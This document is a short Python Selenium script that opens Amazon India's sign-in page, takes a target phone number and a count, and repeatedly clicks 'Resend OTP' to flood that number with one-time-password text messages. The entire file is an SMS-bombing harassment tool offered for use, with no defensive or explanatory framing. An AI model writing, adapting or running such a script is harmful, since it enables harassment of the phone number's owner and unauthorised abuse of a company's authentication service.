from selenium import webdriver

option= webdriver.ChromeOptions()
option.binary_location= r'C:\\Program Files (x86)\\Google\Chrome\\Application\\chrome.exe'
driver= webdriver.Chrome(executable_path='D:\\Softwares\\chromedriver.exe', chrome_options=option)

driver.get('https://www.amazon.in/ap/signin?_encoding=UTF8&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_AccountFlyout_signout%26signIn%3D1%26useRedirectOnSuccess%3D1')

phone_no= input("Enter the phone number to blast")
times= input("How many times to send OTP")

driver.find_element_by_id('ap_email').send_keys("+91" + phone_no)
driver.find_element_by_id('continue').click()
driver.find_element_by_id('continue').click()

for i in range(int(times)):
    driver.find_element_by_link_text('Resend OTP').click()

